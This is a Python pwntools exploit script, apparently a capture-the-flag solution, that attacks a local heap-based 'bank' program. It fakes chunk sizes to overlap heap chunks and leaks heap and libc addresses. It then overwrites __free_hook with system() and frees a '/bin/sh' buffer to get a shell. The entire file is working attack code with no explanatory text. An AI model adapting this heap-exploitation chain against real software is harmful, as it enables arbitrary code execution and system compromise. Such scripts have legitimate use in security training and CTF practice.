#!/usr/bin/env python
import pwn
import re

p = pwn.process(['./bank'])
pwn.context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

la3tosys = -0x17bba0
systofreehook = 0x17cd28

def create_account(title, stsize, statement, sen1 = 0, sen2 = 0):
    p.recvuntil("status")
    p.sendline("1")
    p.recvuntil("account:")
    if sen1 == 0:
        p.sendline(title)
    else:
        p.send(title)
    p.recvuntil("statement:")
    p.sendline(str(stsize))
    if sen2 == 0:
        p.sendline(statement)
    else:
        p.send(statement)
    return

def edit_title(index, title, sen = 0):
    p.recvuntil("status")
    p.sendline("2")
    p.recvuntil("account:")
    p.sendline(str(index))
    if sen == 0:
        p.sendline(title)
    else:
        p.send(title)
    return

def edit_statement(index, statement, sen = 0):
    p.recvuntil("status")
    p.sendline("3")
    p.recvuntil("account:")
    p.sendline(str(index))
    if sen == 0:
        p.sendline(statement)
    else:
        p.send(statement)
    return

def shutdown_account(index):
    p.recvuntil("status")
    p.sendline("4")
    p.recvuntil("account:")
    p.sendline(str(index))
    return

def view_status(index):
    p.recvuntil("status")
    p.sendline("5")
    p.recvuntil("account:")
    p.sendline(str(index))
    r = p.recvuntil("an account")
    return r

def quit():
    p.recvuntil("status")
    p.sendline("6")
    return



create_account("AAAA",0x18,"/bin/sh\x00")
create_account("AAAA",0x18,"BBBB")
create_account("AAAA",0x18,"B"*8+pwn.p64(0x21))
create_account("AAAA",0x18,"CCCC")
shutdown_account(1)
create_account("A"*0x10+"\x71",0x18,"CCCC",1)
shutdown_account(1)
shutdown_account(2)
shutdown_account(3)
create_account("AAAA",0x60,"D"*8+"D"*8+"D"*0x18 + pwn.p64(0x31)[:-1])
create_account("AAAA",0x28,"FFFF")
create_account(pwn.p64(0xdeadbeef),0x40,"BBCC")
create_account(pwn.p64(0xdeadbeef),0x40,"BBCC",1)
r = view_status(1)
r = re.search("Statement:.*",r).group(0)[27:]
la = pwn.util.packing.unpack(r.ljust(8,"\x00"),'all',endian='little', signed = False)
print "[+] Address of signature: "+hex(la) 
edit_title(4, pwn.p64(0x31),1)
shutdown_account(3)
la2 = la+0x100
edit_title(4,pwn.p64(0x31)+pwn.p64(la2))
create_account("A",0x40,"BB")
create_account("A",0x40,"CC")
la2 = la + 0x10
create_account("AAAA",0x18,"BBBB")
create_account("AAAA",0x18,"B"*8+pwn.p64(0x21))
create_account("AAAA",0x18,"CCCC")
shutdown_account(6)
create_account("A"*0x10+"\x71",0x18,"CCCC",1)
shutdown_account(6)
s1 = pwn.p64(0)*5 + pwn.p64(0x31)
s1 += pwn.p64(la)
s1 += pwn.p64(0x20) + pwn.p64(la2)
s1 += "AAAA"
create_account("AAAA",0x60,s1)
r = view_status(7)
r = re.search("Statement:.*",r).group(0)[11:]
la3 = pwn.util.packing.unpack(r.ljust(8,"\x00"),'all',endian='little', signed = False)
print "[+] Address of stdin: "+hex(la3)
sys = la3 + la3tosys
freehook = sys + systofreehook
print "[+] System is at: "+hex(sys)
print "[+] Free hook is at: "+hex(freehook)
la2 = freehook
s2 = pwn.p64(0)*5 + pwn.p64(0x31)
s2 += pwn.p64(la)
s2 += pwn.p64(0x200) + pwn.p64(la2)
create_account("AAAA",0x18,"BBBB")
create_account("AAAA",0x18,"B"*8+pwn.p64(0x21))
create_account("AAAA",0x18,"CCCC")
shutdown_account(9)
create_account("A"*0x10+"\x71",0x18,"CCCC",1)
shutdown_account(9)
create_account("AAAA",0x60,s2)
shutdown_account(11)
s3 = pwn.p64(0)*2 + pwn.p64(0x31)
s3 += pwn.p64(0)+pwn.p64(0x21)
s3 += pwn.p64(0)*3 + pwn.p64(0x31)
s3 += pwn.p64(freehook)
edit_title(10,s3,1)
create_account("A"*8,0x20,pwn.p64(sys))
shutdown_account(0)
print "[+] Shell spawned."
print "[!] Use kill $PID to exit."


p.interactive()
